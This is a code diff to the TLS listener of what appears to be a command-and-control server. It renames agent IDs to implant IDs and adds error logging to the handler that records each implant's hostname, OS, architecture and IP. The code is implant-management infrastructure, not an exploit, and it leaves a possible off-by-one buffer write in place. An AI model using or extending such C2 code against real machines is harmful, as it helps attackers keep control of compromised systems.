@@ -53,20 +53,20 @@ void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
 
     char input[255];
     snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);
-    char agent_id[65];
-    GenerateID(input, agent_id);
+    char implant_id[65];
+    GenerateID(input, implant_id);
 
     // check if id already exists in database
-    if (check_implant_id(agent_id) == 1) goto REPLY;
+    if (check_implant_id(implant_id) == 1) goto REPLY;
 
 
-    log_message(LOG_INFO, "New Implant Registration (TCP SSL): agent_id = %s, hostname = %s, os = %s, arch = %s", agent_id,  hostname->valuestring, os->valuestring, arch->valuestring);
+    log_message(LOG_INFO, "New Implant Registration (TCP SSL): implant_id = %s, hostname = %s, os = %s, arch = %s", implant_id,  hostname->valuestring, os->valuestring, arch->valuestring);
 
-    // register to datbase (agent_id, os, ip, mac, hostname)
+    // register to datbase (implant_id, os, ip, mac, hostname)
     // check if agent id exists
     struct db_agents args;
-    strncpy(args.agent_id, agent_id, sizeof(args.agent_id) - 1);
-    args.agent_id[sizeof(args.agent_id) - 1] = '\0';
+    strncpy(args.implant_id, implant_id, sizeof(args.implant_id) - 1);
+    args.implant_id[sizeof(args.implant_id) - 1] = '\0';
     strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
     args.os[sizeof(args.os) - 1] = '\0';
     strncpy(args.ip, ip, sizeof(args.ip) - 1);
@@ -76,17 +76,20 @@ void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
 
     strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
     args.arch[sizeof(args.arch) - 1] = '\0';
+
     new_implant(args);
 
     // reply with agent id
     REPLY:
     cJSON *json_reply = cJSON_CreateObject();
     cJSON_AddStringToObject(json_reply, "mode", "ack");
-    cJSON_AddStringToObject(json_reply, "agent_id", agent_id);
+    cJSON_AddStringToObject(json_reply, "implant_id", implant_id);
 
     char *reply = cJSON_Print(json_reply);
     //send(sock, reply, strlen(reply), 0);
-    SSL_write(ssl, reply, strlen(reply));
+    if (SSL_write(ssl, reply, strlen(reply)) == 0) {
+        log_message(LOG_ERROR, "SSL Write error");
+    }
 
     free(reply);
     cJSON_Delete(json_reply);
@@ -102,14 +105,15 @@ void *tcp_ssl_agent_handler(void *args) {
     //int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
     int bytes_received = SSL_read(ssl, buffer, sizeof(buffer));
     if (bytes_received <= 0) {
-        perror("recv failed");
+        log_message(LOG_ERROR, "Recv failed");
         return NULL;
     }
     buffer[bytes_received] = '\0';
 
     cJSON *json = cJSON_Parse(buffer);
     if (!json) {
-        printf("Error parsing JSON!\n");
+        //printf("Error parsing JSON!\n");
+        log_message(LOG_ERROR, "Error parsing JSON [Implant Handler]");
         return NULL;
     }
 
@@ -128,8 +132,6 @@ void *tcp_ssl_agent_handler(void *args) {
     free(args);
     return NULL;
 }
-
-
 
 
 void* tcp_ssl_listener(void *args) {
@@ -227,7 +229,7 @@ void* tcp_ssl_listener(void *args) {
         struct tcp_ssl_thread_args *args = malloc(sizeof(struct tcp_ssl_thread_args));
         args->ssl = ssl;
         strcpy(args->ip, inet_ntoa(client_addr.sin_addr));
-
+        
         if (pthread_create(&thread, NULL, tcp_ssl_agent_handler, (void*)args) < 0) {
             perror("could not create thread");
             free(args);
